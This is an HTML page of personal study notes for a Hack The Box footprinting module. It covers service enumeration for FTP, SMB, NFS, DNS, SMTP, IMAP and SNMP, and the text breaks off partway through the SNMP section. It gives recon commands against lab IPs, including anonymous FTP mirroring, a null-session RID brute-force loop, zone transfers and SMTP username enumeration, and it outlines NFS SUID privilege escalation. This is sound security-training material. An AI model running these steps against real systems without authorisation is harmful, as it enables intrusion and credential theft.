@@ -1,0 +1,1230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Footprinting — Field Notes</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c10;
+    --surface: #0f1318;
+    --surface2: #151b24;
+    --border: #1e2a38;
+    --accent: #00d4ff;
+    --accent2: #ff6b35;
+    --accent3: #39ff14;
+    --accent4: #c97bff;
+    --text: #c8d8e8;
+    --text-dim: #5a7a96;
+    --text-bright: #e8f4ff;
+    --mono: 'Share Tech Mono', monospace;
+    --head: 'Rajdhani', sans-serif;
+    --body: 'Inter', sans-serif;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: var(--body); font-size: 14px; line-height: 1.7; }
+  body::before { content: ''; position: fixed; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,212,255,0.01) 2px, rgba(0,212,255,0.01) 4px); pointer-events: none; z-index: 9999; }
+
+  /* ── NAV ─────────────────────────────────── */
+  .topbar { border-bottom: 1px solid var(--border); padding: 12px 32px; display: flex; align-items: center; gap: 16px; background: var(--surface); position: sticky; top: 0; z-index: 200; }
+  .topbar-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent3); box-shadow: 0 0 8px var(--accent3); animation: pulse 2s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+  .topbar-title { font-family: var(--mono); font-size: 12px; color: var(--accent); letter-spacing: 2px; text-transform: uppercase; }
+  .topbar-right { margin-left: auto; font-family: var(--mono); font-size: 11px; color: var(--text-dim); }
+
+  /* ── LAYOUT ──────────────────────────────── */
+  .page { display: flex; }
+  .sidebar { width: 220px; flex-shrink: 0; background: var(--surface); border-right: 1px solid var(--border); height: calc(100vh - 49px); position: sticky; top: 49px; overflow-y: auto; padding: 20px 0; }
+  .sidebar::-webkit-scrollbar { width: 4px; } .sidebar::-webkit-scrollbar-thumb { background: var(--border); }
+  .nav-section { padding: 6px 16px 4px; font-family: var(--mono); font-size: 10px; color: var(--text-dim); letter-spacing: 2px; text-transform: uppercase; }
+  .nav-link { display: block; padding: 6px 20px; font-size: 12px; color: var(--text-dim); text-decoration: none; transition: color 0.15s, background 0.15s; border-left: 2px solid transparent; }
+  .nav-link:hover { color: var(--accent); background: rgba(0,212,255,0.05); border-left-color: var(--accent); }
+  .main { flex: 1; min-width: 0; padding: 40px 40px 80px; max-width: 900px; }
+
+  /* ── HERO ────────────────────────────────── */
+  .hero { margin-bottom: 56px; padding-bottom: 32px; border-bottom: 1px solid var(--border); position: relative; }
+  .hero::after { content: ''; position: absolute; bottom: -1px; left: 0; width: 120px; height: 2px; background: var(--accent); box-shadow: 0 0 12px var(--accent); }
+  .hero-label { font-family: var(--mono); font-size: 11px; color: var(--accent2); letter-spacing: 3px; text-transform: uppercase; margin-bottom: 12px; }
+  .hero h1 { font-family: var(--head); font-size: clamp(30px, 4vw, 48px); font-weight: 700; color: var(--text-bright); line-height: 1.1; }
+  .hero h1 span { color: var(--accent); }
+  .hero-sub { margin-top: 14px; color: var(--text-dim); font-size: 13px; max-width: 600px; }
+
+  /* ── SECTION ─────────────────────────────── */
+  .section { margin-bottom: 64px; scroll-margin-top: 70px; }
+  .section-header { display: flex; align-items: center; gap: 14px; margin-bottom: 22px; }
+  .section-num { font-family: var(--mono); font-size: 11px; color: var(--accent); background: rgba(0,212,255,0.08); border: 1px solid rgba(0,212,255,0.2); padding: 2px 8px; border-radius: 3px; flex-shrink: 0; }
+  .section-title { font-family: var(--head); font-size: 22px; font-weight: 600; color: var(--text-bright); }
+  .section-line { flex: 1; height: 1px; background: var(--border); }
+  .subsection { margin: 24px 0 16px; }
+  .subsection-title { font-family: var(--head); font-size: 15px; font-weight: 600; color: var(--text-bright); margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
+
+  /* ── CARDS ───────────────────────────────── */
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 18px 22px; margin-bottom: 14px; position: relative; transition: border-color 0.2s; }
+  .card:hover { border-color: rgba(0,212,255,0.3); }
+  .card::before { content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px; background: var(--accent); border-radius: 6px 0 0 6px; opacity: 0; transition: opacity 0.2s; }
+  .card:hover::before { opacity: 1; }
+  .card-title { font-family: var(--head); font-size: 15px; font-weight: 600; color: var(--text-bright); margin-bottom: 8px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+
+  /* ── TAGS ────────────────────────────────── */
+  .tag { font-family: var(--mono); font-size: 10px; padding: 2px 6px; border-radius: 3px; letter-spacing: 1px; white-space: nowrap; }
+  .tag-tool  { background: rgba(57,255,20,0.1);   color: var(--accent3); border: 1px solid rgba(57,255,20,0.2); }
+  .tag-danger{ background: rgba(255,107,53,0.1);  color: var(--accent2); border: 1px solid rgba(255,107,53,0.2); }
+  .tag-tip   { background: rgba(0,212,255,0.1);   color: var(--accent);  border: 1px solid rgba(0,212,255,0.2); }
+  .tag-port  { background: rgba(201,123,255,0.1); color: var(--accent4); border: 1px solid rgba(201,123,255,0.25); }
+
+  /* ── CODE ────────────────────────────────── */
+  .code-label { font-family: var(--mono); font-size: 10px; color: var(--text-dim); letter-spacing: 1px; text-transform: uppercase; margin-bottom: 5px; }
+  .code-block { background: #060809; border: 1px solid var(--border); border-radius: 4px; padding: 13px 15px; font-family: var(--mono); font-size: 12px; color: var(--accent3); overflow-x: auto; margin: 8px 0; line-height: 1.6; }
+  .code-block .prompt { color: var(--accent2); user-select: none; }
+  .code-block .comment { color: var(--text-dim); }
+  .code-block .flag { color: var(--accent); }
+  .code-block .kw { color: var(--accent4); }
+  code { font-family: var(--mono); font-size: 12px; background: rgba(0,212,255,0.08); color: var(--accent); padding: 1px 5px; border-radius: 3px; }
+
+  /* ── TABLES ──────────────────────────────── */
+  .tbl-wrap { overflow-x: auto; margin: 8px 0 14px; }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th { background: var(--surface2); color: var(--accent); font-family: var(--mono); font-size: 10px; letter-spacing: 1px; text-transform: uppercase; padding: 9px 13px; text-align: left; border-bottom: 1px solid var(--border); }
+  td { padding: 8px 13px; border-bottom: 1px solid rgba(30,42,56,0.6); color: var(--text); vertical-align: top; }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(0,212,255,0.03); }
+  td code, th code { font-size: 11px; }
+  td strong { color: var(--text-bright); }
+
+  /* ── ANSWERS ─────────────────────────────── */
+  .answer-box { background: rgba(57,255,20,0.05); border: 1px solid rgba(57,255,20,0.2); border-radius: 4px; padding: 10px 14px; display: flex; align-items: flex-start; gap: 10px; margin: 8px 0; }
+  .answer-icon { color: var(--accent3); font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+  .answer-q { color: var(--text-dim); font-size: 12px; margin-bottom: 3px; }
+  .answer-a { color: var(--accent3); font-family: var(--mono); font-size: 13px; }
+
+  /* ── STEPS ───────────────────────────────── */
+  .steps { counter-reset: step; }
+  .step { display: flex; gap: 14px; margin-bottom: 18px; }
+  .step-num { width: 26px; height: 26px; flex-shrink: 0; background: rgba(0,212,255,0.1); border: 1px solid rgba(0,212,255,0.3); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-family: var(--mono); font-size: 11px; color: var(--accent); margin-top: 2px; }
+  .step-body { flex: 1; }
+  .step-title { font-family: var(--head); font-size: 14px; font-weight: 600; color: var(--text-bright); margin-bottom: 5px; }
+
+  /* ── ALERT ───────────────────────────────── */
+  .alert { background: rgba(255,107,53,0.07); border: 1px solid rgba(255,107,53,0.25); border-radius: 5px; padding: 13px 17px; margin: 12px 0; font-size: 13px; }
+  .alert-title { color: var(--accent2); font-family: var(--head); font-weight: 600; font-size: 13px; margin-bottom: 6px; }
+  .alert-blue { background: rgba(0,212,255,0.05); border-color: rgba(0,212,255,0.2); }
+  .alert-blue .alert-title { color: var(--accent); }
+
+  /* ── CHAIN ───────────────────────────────── */
+  .chain { display: flex; flex-wrap: wrap; align-items: center; gap: 6px; margin: 14px 0; }
+  .chain-node { background: var(--surface2); border: 1px solid var(--border); border-radius: 4px; padding: 5px 11px; font-family: var(--mono); font-size: 11px; color: var(--text-bright); }
+  .chain-arrow { color: var(--accent2); font-size: 16px; }
+
+  /* ── GRID ────────────────────────────────── */
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+  @media(max-width: 680px){ .grid-2{ grid-template-columns: 1fr; } }
+
+  p { margin-bottom: 10px; }
+  hr { border: none; border-top: 1px solid var(--border); margin: 30px 0; }
+
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-dot"></div>
+  <div class="topbar-title">HTB // Footprinting Module</div>
+  <div class="topbar-right">leviathan@parrot ~ field notes</div>
+</div>
+
+<div class="page">
+
+<!-- ══════════════ SIDEBAR ══════════════ -->
+<nav class="sidebar">
+  <div class="nav-section">Principles</div>
+  <a class="nav-link" href="#principles">01 · Enumeration Principles</a>
+  <a class="nav-link" href="#methodology">15 · Methodology Layers</a>
+
+  <div class="nav-section" style="margin-top:10px;">File / Network</div>
+  <a class="nav-link" href="#ftp">02 · FTP</a>
+  <a class="nav-link" href="#smb">03 · SMB</a>
+  <a class="nav-link" href="#nfs">04 · NFS</a>
+
+  <div class="nav-section" style="margin-top:10px;">DNS / OSINT</div>
+  <a class="nav-link" href="#dns">05 · DNS</a>
+  <a class="nav-link" href="#domain">06 · Domain Info</a>
+  <a class="nav-link" href="#cloud">07 · Cloud Resources</a>
+
+  <div class="nav-section" style="margin-top:10px;">Mail</div>
+  <a class="nav-link" href="#smtp">08 · SMTP</a>
+  <a class="nav-link" href="#imap">09 · IMAP / POP3</a>
+
+  <div class="nav-section" style="margin-top:10px;">Network Mgmt</div>
+  <a class="nav-link" href="#snmp">10 · SNMP</a>
+  <a class="nav-link" href="#ipmi">14 · IPMI</a>
+
+  <div class="nav-section" style="margin-top:10px;">Databases</div>
+  <a class="nav-link" href="#mysql">11 · MySQL</a>
+  <a class="nav-link" href="#mssql">12 · MSSQL</a>
+  <a class="nav-link" href="#oracle">13 · Oracle TNS</a>
+
+  <div class="nav-section" style="margin-top:10px;">Remote Mgmt</div>
+  <a class="nav-link" href="#linux-remote">16 · Linux (SSH/Rsync/R)</a>
+  <a class="nav-link" href="#windows-remote">17 · Windows (WinRM/WMI)</a>
+
+  <div class="nav-section" style="margin-top:10px;">Labs</div>
+  <a class="nav-link" href="#lab-easy">18 · Lab Easy</a>
+  <a class="nav-link" href="#lab-medium">19 · Lab Medium</a>
+  <a class="nav-link" href="#lab-hard">20 · Lab Hard</a>
+</nav>
+
+<!-- ══════════════ MAIN ══════════════ -->
+<main class="main">
+
+  <div class="hero">
+    <div class="hero-label">Module — Footprinting</div>
+    <h1>Service <span>Enumeration</span><br>Field Notes</h1>
+    <div class="hero-sub">20 files covering enumeration principles, every major protocol, databases, remote management, and three complete lab walkthroughs.</div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 01 · ENUMERATION PRINCIPLES         -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="principles">
+    <div class="section-header">
+      <div class="section-num">01</div>
+      <div class="section-title">Enumeration Principles</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="alert alert-blue">
+      <div class="alert-title">Core Idea</div>
+      Enumeration is not just about what you can <em>see</em> — it's equally about reasoning over what you <em>can't</em> see, and why. A closed port, missing banner, or suppressed version string is <strong>information</strong>.
+    </div>
+
+    <div class="subsection-title" style="margin-top:20px;">The Guiding Questions</div>
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">What we CAN see</div>
+        <ul style="padding-left:16px;font-size:13px;line-height:2;">
+          <li>What can we see?</li>
+          <li>What reasons can we have for seeing it?</li>
+          <li>What image does it create?</li>
+          <li>What do we gain from it?</li>
+          <li>How can we use it?</li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="card-title">What we CANNOT see</div>
+        <ul style="padding-left:16px;font-size:13px;line-height:2;">
+          <li>What can we NOT see?</li>
+          <li>What reasons are there that we don't see it?</li>
+          <li>What image results from what we don't see?</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="tbl-wrap" style="margin-top:16px;">
+      <table>
+        <thead><tr><th>#</th><th>Principle</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>There is more than meets the eye. Consider all points of view.</td></tr>
+          <tr><td>2</td><td>Distinguish between what we see and what we do not see.</td></tr>
+          <tr><td>3</td><td>There are always ways to gain more information. Understand the target.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 02 · FTP                            -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="ftp">
+    <div class="section-header">
+      <div class="section-num">02</div>
+      <div class="section-title">FTP</div>
+      <div class="section-line"></div>
+    </div>
+    <p>File Transfer Protocol — plaintext, port <span class="tag tag-port">TCP 21</span> (control) / port 20 (active data). A frequent source of leaked credentials and exposed files.</p>
+
+    <div class="card">
+      <div class="card-title">Service Interaction</div>
+      <div class="code-block"><span class="prompt">$ </span>nc -nv 10.129.14.136 21          <span class="comment"># grab banner</span>
+<span class="prompt">$ </span>openssl s_client -connect 10.129.14.136:21 -starttls ftp  <span class="comment"># SSL/TLS</span>
+<span class="prompt">$ </span>wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136  <span class="comment"># mirror everything</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Dangerous Settings <span class="tag tag-danger">WATCH FOR</span></div>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Setting</th><th>Risk</th></tr></thead>
+          <tbody>
+            <tr><td><code>anonymous_enable=YES</code></td><td>Anonymous login allowed</td></tr>
+            <tr><td><code>anon_upload_enable=YES</code></td><td>Anonymous file upload → potential code execution</td></tr>
+            <tr><td><code>anon_mkdir_write_enable=YES</code></td><td>Anonymous can create directories</td></tr>
+            <tr><td><code>no_anon_password=YES</code></td><td>No password required for anonymous</td></tr>
+            <tr><td><code>write_enable=YES</code></td><td>Enables STOR, DELE, RNFR, MKD, RMD, etc.</td></tr>
+            <tr><td><code>hide_ids=YES</code></td><td>All listings show as <code>ftp</code> — hides real owners</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="alert">
+      <div class="alert-title">💡 /etc/ftpusers</div>
+      If you can read this file, you learn which accounts the admin considered sensitive enough to block — a hint about valuable usernames. If a passive-mode data channel hangs, toggle <code>passive</code> off in the ftp prompt or switch to wget.
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 03 · SMB                            -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="smb">
+    <div class="section-header">
+      <div class="section-num">03</div>
+      <div class="section-title">SMB</div>
+      <div class="section-line"></div>
+    </div>
+    <p>Server Message Block — ports <span class="tag tag-port">TCP 445</span> (modern) / 137, 138, 139 (NetBIOS legacy). Samba is the Unix implementation. Access governed by ACLs defined at the share level.</p>
+
+    <div class="card">
+      <div class="card-title">Dangerous Settings <span class="tag tag-danger">WATCH FOR</span></div>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Setting</th><th>Risk</th></tr></thead>
+          <tbody>
+            <tr><td><code>guest ok = yes</code></td><td>No password needed</td></tr>
+            <tr><td><code>read only = no</code> / <code>writable = yes</code></td><td>File creation and modification</td></tr>
+            <tr><td><code>create mask = 0777</code></td><td>World-writable files</td></tr>
+            <tr><td><code>logon script = script.sh</code></td><td>Script runs on every user login</td></tr>
+            <tr><td><code>magic script = script.sh</code></td><td>Script runs on session close</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="subsection-title">Enumeration Commands</div>
+    <div class="card">
+      <div class="card-title">rpcclient (null session)</div>
+      <div class="code-block"><span class="prompt">$ </span>rpcclient -U "" 10.129.14.128
+rpcclient $> srvinfo          <span class="comment"># server info</span>
+rpcclient $> enumdomusers     <span class="comment"># list users</span>
+rpcclient $> netshareenumall  <span class="comment"># list shares</span>
+rpcclient $> queryuser 0x3e8  <span class="comment"># specific user by RID</span></div>
+    </div>
+    <div class="card">
+      <div class="card-title">RID Brute Force</div>
+      <div class="code-block"><span class="prompt">$ </span><span class="kw">for</span> i in $(seq 500 1100); <span class="kw">do</span>
+    rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" \
+    | grep "User Name\|user_rid\|group_rid" && echo ""
+<span class="kw">done</span></div>
+    </div>
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">SMBmap</div>
+        <div class="code-block"><span class="prompt">$ </span>smbmap -H 10.129.14.128</div>
+        <p style="font-size:12px;margin-top:8px;">Shows share names + your permission level on each.</p>
+      </div>
+      <div class="card">
+        <div class="card-title">CrackMapExec</div>
+        <div class="code-block"><span class="prompt">$ </span>crackmapexec smb 10.129.14.128 \
+  --shares -u '' -p ''</div>
+        <p style="font-size:12px;margin-top:8px;">Note: reports SMB version + signing status.</p>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">enum4linux-ng</div>
+      <div class="code-block"><span class="prompt">$ </span>./enum4linux-ng.py 10.129.14.128 -A   <span class="comment"># -A = all checks</span></div>
+    </div>
+    <div class="alert">
+      <div class="alert-title">💡 Use more than one tool</div>
+      Different tools surface different information. Cross-check findings manually rather than trusting any single automated result.
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 04 · NFS                            -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="nfs">
+    <div class="section-header">
+      <div class="section-num">04</div>
+      <div class="section-title">NFS</div>
+      <div class="section-line"></div>
+    </div>
+    <p>Network File System — ports <span class="tag tag-port">TCP/UDP 111</span> (rpcbind) + <span class="tag tag-port">TCP 2049</span> (nfs). Unix-origin, <strong>no built-in auth</strong> — trusts client-reported UID/GID entirely.</p>
+
+    <div class="card">
+      <div class="card-title">The Core Flaw</div>
+      <p style="font-size:13px;">If you can present a UID matching a file's owner, you get that owner's access. With <code>no_root_squash</code> enabled, you can create a root-owned SUID binary on the share from your attacking machine, then execute it on the target to gain root.</p>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Dangerous Settings <span class="tag tag-danger">CRITICAL</span></div>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Option</th><th>Risk</th></tr></thead>
+          <tbody>
+            <tr><td><code>no_root_squash</code></td><td>Root keeps UID/GID 0 → SUID privesc via NFS</td></tr>
+            <tr><td><code>insecure</code></td><td>Unprivileged clients (ports >1024) can connect</td></tr>
+            <tr><td><code>nohide</code></td><td>Exports nested mounts too</td></tr>
+            <tr><td><code>rw</code></td><td>Read-write access</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Footprinting &amp; Mounting</div>
+      <div class="code-block"><span class="prompt">$ </span>sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
+<span class="prompt">$ </span>showmount -e 10.129.14.128
+<span class="prompt">$ </span>mkdir target-NFS
+<span class="prompt">$ </span>sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
+<span class="prompt">$ </span>sudo umount ./target-NFS    <span class="comment"># always unmount cleanly</span></div>
+    </div>
+
+    <div class="alert">
+      <div class="alert-title">⚠ Common Gotchas</div>
+      NFS paths are <strong>case-sensitive</strong>. Mount point must exist before mounting. UID <code>4294967294</code> = squashed <code>nobody</code> — files owned by it may need <code>sudo</code> to read.
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 05 · DNS                            -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="dns">
+    <div class="section-header">
+      <div class="section-num">05</div>
+      <div class="section-title">DNS</div>
+      <div class="section-line"></div>
+    </div>
+    <p>Port <span class="tag tag-port">53/UDP</span> (queries) / <span class="tag tag-port">53/TCP</span> (zone transfers + large responses). 13 root servers worldwide, coordinated by ICANN.</p>
+
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Record</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td><code>A</code></td><td>IPv4 address for a domain</td></tr>
+          <tr><td><code>AAAA</code></td><td>IPv6 address</td></tr>
+          <tr><td><code>MX</code></td><td>Mail servers</td></tr>
+          <tr><td><code>NS</code></td><td>Nameservers</td></tr>
+          <tr><td><code>TXT</code></td><td>Free-form — SPF, DMARC, DKIM, verification strings</td></tr>
+          <tr><td><code>CNAME</code></td><td>Alias pointing to another domain</td></tr>
+          <tr><td><code>PTR</code></td><td>Reverse lookup (IP → domain)</td></tr>
+          <tr><td><code>SOA</code></td><td>Zone info + admin email contact</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Key dig Commands</div>
+      <div class="code-block"><span class="prompt">$ </span>dig ns inlanefreight.htb @10.129.14.128     <span class="comment"># NS records</span>
+<span class="prompt">$ </span>dig any inlanefreight.htb @10.129.14.128    <span class="comment"># everything at once</span>
+<span class="prompt">$ </span>dig axfr inlanefreight.htb @10.129.14.128   <span class="comment"># zone transfer</span>
+<span class="prompt">$ </span>dig CH TXT version.bind 10.129.120.85       <span class="comment"># BIND version (CVEs)</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Dangerous Settings <span class="tag tag-danger">WATCH FOR</span></div>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Option</th><th>Risk</th></tr></thead>
+          <tbody>
+            <tr><td><code>allow-transfer</code> (too broad)</td><td>Anyone can pull the entire zone file → all subdomains exposed</td></tr>
+            <tr><td><code>allow-recursion</code> (open)</td><td>DNS amplification abuse</td></tr>
+            <tr><td><code>allow-query</code> (open)</td><td>Internal records queryable from outside</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 06 · DOMAIN INFO                    -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="domain">
+    <div class="section-header">
+      <div class="section-num">06</div>
+      <div class="section-title">Domain Information (Passive Recon)</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">crt.sh <span class="tag tag-tool">OSINT</span></div>
+        <p style="font-size:13px;">Searches Certificate Transparency logs. Every TLS cert is logged publicly — reveals subdomains not meant to be exposed.</p>
+        <div class="code-block"><span class="prompt">$ </span>curl -s "https://crt.sh/?q=example.com&output=json" | jq</div>
+      </div>
+      <div class="card">
+        <div class="card-title">Shodan <span class="tag tag-tool">OSINT</span></div>
+        <p style="font-size:13px;">Indexes internet-connected devices and banners. Find externally exposed services without touching the target.</p>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:4px;">
+      <div class="card-title">Reading TXT Records as a Provider Map</div>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Provider in TXT</th><th>Implication</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Atlassian</strong></td><td>Jira/Confluence — look for exposed boards or wikis</td></tr>
+            <tr><td><strong>Google Gmail / MX</strong></td><td>Email via Google; possibly open Drive folders</td></tr>
+            <tr><td><strong>LogMeIn</strong></td><td>Centralized remote access — one compromised admin = all connected systems</td></tr>
+            <tr><td><strong>Mailgun</strong></td><td>Email APIs — watch for IDOR/SSRF on API endpoints</td></tr>
+            <tr><td><strong>Outlook / O365</strong></td><td>Often paired with OneDrive + Azure SMB storage</td></tr>
+            <tr><td><strong>INWX (MS= string)</strong></td><td>Often matches the management platform login ID</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 07 · CLOUD RESOURCES                -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="cloud">
+    <div class="section-header">
+      <div class="section-num">07</div>
+      <div class="section-title">Cloud Resources</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">domain.glass</div>
+        <p style="font-size:13px;">Reveals infrastructure details. A Cloudflare "Safe" status tells you a gateway-layer protection (Layer 2) exists.</p>
+      </div>
+      <div class="card">
+        <div class="card-title">GrayHatWarfare <span class="tag tag-tool">OSINT</span></div>
+        <p style="font-size:13px;">Indexes publicly exposed buckets across AWS, Azure, GCP. Filter by file format. Passively confirm bucket contents before touching them directly.</p>
+      </div>
+    </div>
+
+    <div class="tbl-wrap" style="margin-top:10px;">
+      <table>
+        <thead><tr><th>Provider</th><th>Service</th><th>Notes</th></tr></thead>
+        <tbody>
+          <tr><td><strong>AWS</strong></td><td>S3 buckets</td><td>Most commonly misconfigured; predictable naming (<code>company-backups</code>, <code>company-dev</code>)</td></tr>
+          <tr><td><strong>Azure</strong></td><td>Blob + File storage</td><td>Azure File uses SMB — enumerate with familiar SMB tools</td></tr>
+          <tr><td><strong>GCP</strong></td><td>Cloud Storage</td><td>Similar exposure risks to S3</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 08 · SMTP                           -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="smtp">
+    <div class="section-header">
+      <div class="section-num">08</div>
+      <div class="section-title">SMTP</div>
+      <div class="section-line"></div>
+    </div>
+    <p>Simple Mail Transfer Protocol — port <span class="tag tag-port">25</span> (relay) / <span class="tag tag-port">587</span> (submission). <strong>VRFY</strong> and <strong>EXPN</strong> commands confirm valid mailboxes = valid usernames.</p>
+
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Command</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td><code>VRFY</code></td><td>Checks if a mailbox exists — <strong>username enumeration!</strong></td></tr>
+          <tr><td><code>EXPN</code></td><td>Also checks mailbox availability</td></tr>
+          <tr><td><code>HELO/EHLO</code></td><td>Client identifies itself</td></tr>
+          <tr><td><code>MAIL FROM</code></td><td>Sender address</td></tr>
+          <tr><td><code>RCPT TO</code></td><td>Recipient address</td></tr>
+          <tr><td><code>AUTH PLAIN</code></td><td>Authentication extension</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Footprinting</div>
+      <div class="code-block"><span class="prompt">$ </span>sudo nmap 10.129.14.128 -sC -sV -p25
+<span class="comment"># Look for: VRFY in smtp-commands list, banner leaks hostname</span>
+<span class="prompt">$ </span>smtp-user-enum -M VRFY -U wordlist.txt -t 10.129.88.93 -m 60 -w 20
+<span class="comment"># Result: "10.129.88.93: robin exists"  → feed into credential attacks</span></div>
+    </div>
+
+    <div class="alert">
+      <div class="alert-title">💡 Banner Intelligence</div>
+      The SMTP banner leaks the internal hostname/domain (e.g. <code>mail1.inlanefreight.htb</code>). A confirmed valid username from VRFY is a target for SSH, IMAP, or any other service on the same host.
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 09 · IMAP / POP3                    -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="imap">
+    <div class="section-header">
+      <div class="section-num">09</div>
+      <div class="section-title">IMAP / POP3</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">Ports</div>
+        <ul style="font-size:13px;line-height:2;padding-left:16px;">
+          <li>IMAP: <code>143</code> / <code>993</code> (TLS)</li>
+          <li>POP3: <code>110</code> / <code>995</code> (TLS)</li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="card-title">Dangerous Dovecot Settings</div>
+        <ul style="font-size:12px;line-height:1.9;padding-left:14px;">
+          <li><code>auth_debug_passwords</code> — logs submitted passwords</li>
+          <li><code>auth_verbose_passwords</code> — logs (truncated) passwords</li>
+          <li><code>auth_debug</code> — all auth debug logging</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:8px;">
+      <div class="card-title">Connect + Read Mail (TLS)</div>
+      <div class="code-block"><span class="prompt">$ </span>openssl s_client -connect 10.129.88.93:imaps
+
+1 LOGIN username password
+1 LIST "" *
+1 SELECT INBOX
+1 FETCH 1 BODY[]     <span class="comment"># read first message</span></div>
+    </div>
+
+    <div class="alert">
+      <div class="alert-title">💡 Always Read the Inbox</div>
+      Mailboxes frequently contain exactly what you're hunting — password reset emails, config snippets, or SSH private keys pasted into message bodies (as in the Hard lab). The TLS certificate's <code>commonName</code> also leaks the internal hostname.
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 10 · SNMP                           -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="snmp">
+    <div class="section-header">
+      <div class="section-num">10</div>
+      <div class="section-title">SNMP</div>
+      <div class="section-line"></div>
+    </div>
+    <p>Simple Network Management Protocol — <span class="tag tag-port">UDP 161</span>. V1/V2c use community strings (password-like). Defaults <code>public</code> (read) and <code>private</code> (write) are extremely common.</p>
+
+    <div class="card">
+      <div class="card-title">Dangerous Settings <span class="tag tag-danger">CRITICAL</span></div>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Setting</th><th>Risk</th></tr></thead>
+          <tbody>
+            <tr><td><code>rwuser noauth</code></td><td>Full OID-tree access with no authentication</td></tr>
+            <tr><td><code>rwcommunity &lt;string&gt; &lt;IP&gt;</code></td><td>Full read-write access regardless of source</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="card">
